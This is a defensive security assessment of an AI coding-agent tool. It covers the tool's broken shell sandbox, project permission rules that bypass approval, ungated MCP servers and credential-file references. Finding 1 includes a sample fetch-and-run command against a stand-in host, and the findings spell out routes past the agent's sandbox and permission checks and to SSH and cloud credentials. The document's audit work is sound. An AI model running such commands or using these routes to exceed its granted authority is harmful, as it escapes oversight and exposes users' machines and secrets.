# Security Assessment and Remediation Plan

- **Original assessment:** 2026-07-21
- **Current status:** Updated 2026-08-14; active risk register
- **Priority:** Close the three cheap containment gaps now; add an explicit workspace trust
  boundary before treating cloned project configuration as executable policy.

This document describes current residual risks, not a claim that Book has no security controls.
Since the original assessment, web SSRF defenses, permission-mode resolution, project bypass-mode
sanitization, strict agent tool capabilities, bounded MCP/process lifecycles, secret-safe telemetry,
MCP project-server approval, and several persistence boundaries have been hardened. The central
workspace-trust gap remains.

## Primary Threat Model

The dominant adversary is **a repository the user clones and opens**. Book discovers
`.book/settings.json`, `.mcp.json`, `.book/commands/*.md`, `.book/agents/`, and project
instructions from the working tree and treats them as policy. No user decision separates "code I
am reading" from "configuration I am executing." Every critical finding below is an instance of
that one gap.

Secondary adversaries: model-generated tool calls attempting to exceed the user's granted
authority, and remote content (web fetches, MCP tool results, skill resources) attempting prompt
injection. Both have meaningful existing controls; the first has the weaker ones.

## Current Risk Summary

Severity reflects impact × exploitability from the primary threat model. Effort is a rough
engineering estimate for the remediation described in the linked finding.

| Area | Severity | Effort | Current state |
| --- | --- | --- | --- |
| Shell sandbox | Open - critical | S (fix-or-remove) | The bwrap wrapper is joined into a string and run under `shell: true`, so any shell metacharacter escapes the sandbox. Declared `filesystem`/network policy is not read at all. |
| Project permission allow-rules | Open - critical | S | `defaultMode: bypassPermissions` is blocked, but project-layer `permissions.allow` concatenates into the resolved allow list and reaches the same outcome. |
| MCP in headless/SDK flows | Open - critical | S | A fingerprinted approval gate now exists but is wired into the TUI only; headless and SDK entry points connect project servers directly. |
| Project hooks | Open - critical | M | Project hook entries concatenate into the resolved hook list and execute during lifecycle events. |
| Project providers/credentials | Open - critical | M | Lower-trust project provider blocks can select endpoints and credential references. |
| Workspace trust | Open - critical | L | There is no user-owned trust database or first-open review gate. Type contracts are reserved but unimplemented. |
| Delegation boundary | Partial - high | M | Agent tool lists are strict and managed agents inherit bounded capabilities, but legacy subagents execute their allowed surface without nested interactive prompts. |
| Custom command shell substitution | Open - high | M | `!` shell substitutions execute asynchronously with bounds, but outside the normal Bash permission/hook/sandbox audit path. |
| Permission mode selection | Resolved | — | Startup mode resolution is shared, project/local settings cannot select bypass as default, and `disableBypassPermissionsMode` blocks explicit/cycled bypass. Scope is the *mode* channel only — see the allow-rule row above. |
| Web SSRF/response bounds | Resolved | — | HTTPS/public-network defaults, DNS/connect-time validation, redirect revalidation, and response limits are implemented. |
| Snapshot privacy | Documented residual risk | — | Managed snapshots may store non-ignored untracked files in the local Git object database; rewind intentionally snapshots broad local state. |
| Supply chain | Open - medium | S | Actions use version tags rather than immutable SHAs; provenance/attestation and advanced scanning are not configured. |

**Interim mitigation available today:** permission arrays concatenate across layers and `deny` is
evaluated before `ask` and `allow` (`src/permissions.ts:141`), so a **user-global**
`permissions.deny` entry cannot be removed or overridden by any project or local layer. Operators
who need containment before the fixes land should place blanket deny rules in
`~/.book/settings.json`. This is a real ceiling, not a workaround for the model's benefit.

## Assets and Trust Boundaries

Protect local files, API/SSH/cloud credentials, shell authority, provider prompts and results,
memories/sessions, local/private network access, and persisted worktree/job/snapshot data.

The important boundaries are user-global state versus repository-controlled state, user approval
versus model-generated calls, root permissions versus delegated capabilities, local resources
versus remote content/providers, and declared sandbox policy versus restrictions actually enforced
by the operating system.

## Open Findings

Ordered by remediation sequence, not by severity. Findings 1-3 are the containment tier: each is
small, independently shippable, and closes a currently-open path.

### 1. Sandbox Enforcement Is Bypassed by Any Shell Metacharacter

*Owner: TBD — Target: TBD*

`buildBwrapCmd` assembles its argv into a single string with `parts.join(' ')`
(`src/sandbox.ts:88`), and `Bash` executes that string via `spawn(effectiveCommand, { shell: true })`
(`src/tools/shell.ts:132`). The outer shell therefore re-parses the joined string, and everything
after a `;`, `&&`, `|`, or newline runs **outside** the sandbox in the parent shell. For
`foo; curl https://example.invalid/x | sh`, only `foo` is confined.

Two further defects in the same function:

- The `_settings` parameter is unused (`src/sandbox.ts:49`). The `filesystem` and network keys in
  the sandbox schema are never read; `--share-net` is unconditional and the workspace is always
  mounted read/write.
- Because the command is not quoted as a single argument, ordinary use is also broken:
  `/bin/bash -c cat file.txt` binds `file.txt` to `$0`, so `cat` reads stdin instead of the file.

The third point is the important signal. A control this broken would fail on the first real
invocation, which indicates the sandbox has no meaningful test coverage and is likely unused. Treat
this as a fix-or-remove decision, not only a hardening task: a non-functional control that is
documented in `README.md` is worse than no control, because users rely on it.

Required remediation:

- Decide explicitly whether to fix or withdraw the sandbox. If withdrawn, remove it from
  `README.md` and settings, and make `sandbox.enabled` a hard startup error rather than a warning.
- If fixed: execute bubblewrap with structured argv and `shell: false`, passing the user command as
  one argument.
- Enforce read/write/deny mounts and a defined network policy from the settings actually passed in.
- Remove model-controlled sandbox escape paths, or require an independent approval.
- Define fail-closed behavior on Windows/macOS until a supported backend exists. Windows currently
  warns and continues unsandboxed unless `failIfUnavailable` is set.
- Add Linux integration tests for shell metacharacters, filesystem boundaries, and networking.

### 2. Project-Layer Permission Allow-Rules Reach the Blocked Outcome

*Owner: TBD — Target: TBD*

`sanitizeUntrustedPermissionSettings` (`src/settings-loader.ts:82`) is the only filter applied to
lower-trust layers, and it removes exactly one field: `defaultMode` when set to `bypassPermissions`.

Meanwhile `permissions.allow` and every `hooks.*` event are members of `CONCATENATED_ARRAY_PATHS`
(`src/settings-loader.ts:20`), and project `.book/settings.json` is merged with `trusted: false`
(`src/settings-loader.ts:172`). A repository-committed settings file containing
`permissions.allow: ["Bash(*)"]` therefore concatenates into the resolved allow list, and
`evaluatePermission` returns `allow` with no further gate (`src/permissions.ts:219`). Nothing
downstream filters allow rules by originating layer.

The mode channel is closed; the allow-rule channel achieves an equivalent outcome for shell
authority. Until both are closed, the permission-mode hardening should not be read as containment
against a hostile repository.

Required remediation:

- Restrict which rules a lower-trust layer may contribute, or tag rules with their originating
  layer and require approval before honoring project-supplied `allow` entries.
- Apply the same treatment to project-supplied `hooks.*` entries.
- Preserve the existing property that user-global `deny` cannot be weakened by a lower layer, and
  add a regression test asserting it.

### 3. MCP Approval Is Wired Into the TUI Only

*Owner: TBD — Target: TBD*

`src/mcp-approvals.ts` and `src/mcp-host.ts` implement a genuine per-project approval gate:
one-time consent persisted in `.book/settings.local.json`, keyed by a SHA-256 fingerprint over the
full connection configuration, with config changes invalidating the decision and re-prompting.
User-global servers are trusted without prompting, which is correct.

That gate is reached only through `McpSessionHost` (`src/cli/run.ts:275`), the interactive path. The
headless runner (`src/cli/run.ts:169`) and the SDK (`src/sdk.ts:134`) call `connectMcpServers()`
from `src/mcp.ts` directly, with no approval partition. Project-declared MCP servers therefore
start local processes without consent in exactly the flows most likely to run unattended — CI,
automation, and embedding.

This is the highest value-per-effort item on the register: the control exists and correct behavior
is already specified: it needs to move below the entry points rather than sit beside one of them.

Required remediation:

- Move approval partitioning into the shared server-resolution path so every consumer inherits it,
  rather than replicating the check in each entry point.
- Define non-interactive semantics explicitly: default to skipping unapproved project servers, and
  surface a diagnostic naming each skipped server.
- Add an explicit opt-in input for automation, and honor `--no-mcp`.
- Add an architecture rule (see Required Regression Tests) preventing entry points from importing
  `connectMcpServers` directly.

### 4. Provider Credentials Need Origin Binding

*Owner: TBD — Target: TBD*

Provider configuration supports environment/file-backed credentials and arbitrary compatible base
URLs. Project scope must not be able to redirect a trusted credential to a new origin.

`resolveSecret` (`src/config.ts:284`) already guards the relative-path case: a `{file:...}` value
resolving outside the workspace root returns `undefined` (`src/config.ts:302`). That guard does not
cover the two paths that matter most — `{file:~/...}` resolves against the home directory
(`src/config.ts:294`) and an absolute `{file:/...}` is used verbatim (`src/config.ts:296`), so
`~/.ssh/id_rsa` and `~/.aws/credentials` are both readable. `{env:VAR}` reads any variable in the
process environment with no restriction.

Combined with project-layer `provider.*` merging and `provider.baseURL` selecting the request origin
(`src/config.ts:267`), a single repository-committed settings file can bind a local secret to a
remote endpoint of its choosing. The existing relative-path guard shows this was already considered;
it stops one case short of the exposure.

Required remediation:

- Bind credentials to approved HTTPS origins and confirm origin changes.
- Restrict project/local `{env:...}` and `{file:...}` references to explicitly approved sources;
  extend the existing containment check to cover `~/` and absolute paths.
- Apply the same URL policy to model discovery and model requests.
- Permit HTTP only for explicitly approved local development endpoints.

### 5. Project-Controlled Executable Surfaces Need Trust Gating

*Owner: TBD — Target: TBD*

`.book/settings.json`, project MCP configuration, custom commands, agent definitions, and project
instructions are discovered without a persistent workspace trust decision. Hooks and MCP commands
can execute local programs; custom commands can contain shell substitutions; provider settings can
change the remote origin used for model traffic.

Findings 1-4 are individual instances of this gap and can be closed independently. This finding is
the durable answer that prevents the next instance.

Implementation note: `src/harness/contracts.ts:354` already declares `WorkspaceTrustState`
(`'trusted' | 'untrusted' | 'unknown'`), `WorkspaceTrustReference`, and a
`workspaceTrustFingerprint` field carried through `src/harness/run-store.ts` and excluded by
`src/harness/redaction.ts`. These are reserved type contracts with no producer behind them — the
schema shape exists, the store and the decision flow do not. Start there rather than from scratch,
and reuse the fingerprint-and-invalidate pattern already proven in `src/mcp-approvals.ts`.

Required remediation:

- Store trust outside the repository, keyed by canonical workspace identity.
- Start unseen workspaces untrusted and enumerate every disabled executable/credential-bearing
  surface before opt-in.
- Gate project hooks, MCP commands, providers, permission allows, command shell substitutions, and
  privileged agents separately or behind a clearly reviewed trust decision.
- Add CI-safe controls such as `--no-project-config`, `--no-mcp`, and an explicit trust input.

### 6. Nested and Hidden Execution Must Reuse the Tool Pipeline

*Owner: TBD — Target: TBD*

Strict agent allowlists and parent capability intersections reduce delegation risk, but legacy
subagents and custom command shell substitutions still avoid the normal interactive Bash approval
surface for each nested command. Command bodies reach `exec()` directly
(`src/commands/resolve.ts:211`), bypassing permission evaluation, hooks, sandboxing, and telemetry.

Required remediation:

- Route command substitutions through registered Bash preparation, hooks, permission evaluation,
  sandboxing, cancellation, and telemetry.
- Ensure every delegated execution remains below the root permission/sandbox ceiling.
- Preserve source attribution so the UI identifies which command, skill, or agent requested work.

### 7. Supply-Chain Pinning and Release Provenance

*Owner: TBD — Target: TBD*

`.github/workflows/ci.yml` and `.github/workflows/stabilization.yml` reference `actions/checkout@v7`
and `actions/setup-node@v7` by mutable version tag. Provenance/attestation and advanced scanning are
not configured.

Required remediation:

- Pin actions to immutable commit SHAs with a version comment.
- Enable dependency and secret scanning, and add provenance/attestation to the release path.

## Completed Hardening

- `WebFetch` rejects credentials in URLs, requires HTTPS by default, blocks private/special-use
  destinations, validates resolved and connected addresses, bounds redirects and bodies, and stops
  at cross-origin redirects for a new permission decision.
- `WebSearch` uses a fixed HTTPS provider endpoint and bounded validated responses.
- Project/local settings cannot select `bypassPermissions` as the default, and a trusted global
  `disableBypassPermissionsMode` ceiling cannot be weakened by lower-trust layers. Scope is limited
  to the mode channel; see finding 2.
- MCP project servers require one-time fingerprinted approval, persisted per project, invalidated on
  configuration change. Scope is limited to the interactive host; see finding 3.
- Agent definitions treat missing/empty tools as no tools; `*` is explicit inheritance and
  argument rules are checked at execution.
- Managed-agent persistence uses ownership leases, bounded recovery, atomic writes, and safe
  diagnostics that omit prompts, transcripts, credentials, and environment values.
- Tool schemas are closed and normalized before permission/hook checks; aliases cannot bypass
  path-scoped rules.

## Required Regression Tests

Each assertion names where it should live. Items marked *mechanical* belong in
`scripts/check-architecture.ts` so a violation fails `npm run check` rather than relying on review.

1. *Mechanical.* `connectMcpServers` must not be imported outside the approval-gated resolver
   module. Current direct callers to migrate: `src/cli/run.ts` (headless branch) and `src/sdk.ts`.
   (finding 3)
2. Headless and SDK runs do not connect an unapproved project MCP server, and report each skipped
   server by name. `src/mcp-approvals.test.ts`. (finding 3)
3. A project-layer `permissions.allow` entry does not grant execution without approval, and a
   user-global `permissions.deny` entry cannot be weakened by any lower layer.
   `src/settings-loader.test.ts`. (finding 2)
4. An untrusted workspace cannot execute project hooks, MCP commands, provider redirects, command
   substitutions, or privileged agent definitions. (finding 5)
5. Lower-trust provider settings cannot resolve or redirect user-global credentials without
   approval, including `{file:~/...}`, absolute `{file:...}`, and `{env:...}` forms.
   `src/config.test.ts`. (finding 4)
6. Sandbox shell metacharacters remain inside the sandboxed command argument — assert that a
   command containing `;` produces no side effect outside the sandbox. Linux integration tier.
   (finding 1)
7. Sandbox filesystem and network settings change observable OS-level behavior. Linux integration
   tier. (finding 1)
8. Delegated work cannot exceed root permission, sandbox, network, or tool ceilings. (finding 6)
9. `disableBypassPermissionsMode` prevents every route into bypass mode.
10. Web requests continue to block private/metadata destinations after DNS and redirects and stop at
    the configured response limit.
11. Sessions, exports, logs, feedback reports, and terminal rendering apply their documented
    redaction/control-sequence policies.

If the sandbox is withdrawn rather than fixed, items 6 and 7 are replaced by a single assertion that
enabling `sandbox` fails closed on every platform without a working backend.

## Delivery Order

Containment first. The three items in stage 1 are individually small and each closes a currently
open path; workspace trust is the correct architecture but is the largest piece of work, and
sequencing it first leaves every path open for its full duration.

1. **Containment (stage 1).** Sandbox fix-or-remove decision; project allow-rule restriction; MCP
   approval moved below the entry points. Findings 1-3.
2. **Credential origin binding** and project secret restrictions. Finding 4.
3. **Workspace trust** and executable-surface review, built on the reserved harness contracts.
   Finding 5. Supersedes the per-surface patches in stage 1 as the general answer.
4. **Unified nested execution** through the normal tool pipeline. Finding 6.
5. **Supply-chain pinning**, secret/dependency scanning, and release provenance. Finding 7.
